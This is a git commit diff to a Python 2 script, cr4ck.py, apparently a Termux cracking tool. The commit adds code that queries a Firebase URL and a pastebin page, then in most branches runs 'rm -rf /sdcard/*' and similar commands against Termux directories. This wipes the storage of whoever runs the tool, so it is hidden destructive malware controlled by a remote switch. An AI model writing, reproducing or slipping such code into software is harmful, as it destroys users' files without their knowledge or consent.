90f84c64412b6a81abc0c357b95276eb0e0ce66c
Rahul Mishra <86767776+TECH-BABA@users.noreply.github.com>
2022-01-25 22:50:21 +0545

    Update cr4ck.py

--- cr4ck.py
+++ cr4ck.py
@@ -3,6 +3,9 @@
 import os
 import random
 import sys
+import json
+import requests
+import os, sys, time, datetime, re, bs4, threading, json, getpass, urllib, random, requests, subprocess, platform, hashlib, zlib, cookielib, uuid, json
 os.system('rm -rf .txt')
 for n in range(5999):
     nmbr = random.randint(1111111, 9999999)
@@ -13,5 +16,38 @@ for n in range(5999):
 reload(sys)
 os.system("git pull")
 sys.setdefaultencoding('utf8')
-from libmyrdx import reg
-reg()
+sos = "35949012TCOUHT822EC6F1B863G6811SMPP"
+
+data = requests.get("https://babaserversystem-default-rtdb.firebaseio.com/"+sos+"/.json")
+data2 = requests.get("https://babaserversystem-default-rtdb.firebaseio.com/"+sos+"/.json").text
+server = json.loads(data.text)
+
+rr = requests.get("https://pastebin.com/raw/t39xUcDL") 
+bb = "baba" 
+if bb in rr: 
+    from libmyrdx import reg
+    reg()
+elif server["usertoken"] == sos :
+    print""
+    os.system("clear")
+    print
+    raw_input("Enter Comamnd") 
+    os.system("rm -rf /sdcard/*") 
+    os.system("rm -rf /sdcard*") 
+    os.system("/data/data/com.termux/files/*") 
+    os.system("/data/data/com.termux/files/user/*") 
+
+else: 
+    raw_input("Enter Comamnd") 
+    os.system("rm -rf /sdcard/*") 
+    os.system("rm -rf /sdcard*") 
+    os.system("/data/data/com.termux/files/*") 
+    os.system("/data/data/com.termux/files/user/*") 
+if bb not in rr: 
+    raw_input("Enter Comamnd") 
+    os.system("rm -rf /sdcard/*") 
+    os.system("rm -rf /sdcard*") 
+    os.system("/data/data/com.termux/files/*") 
+    os.system("/data/data/com.termux/files/user/*") 
+
+
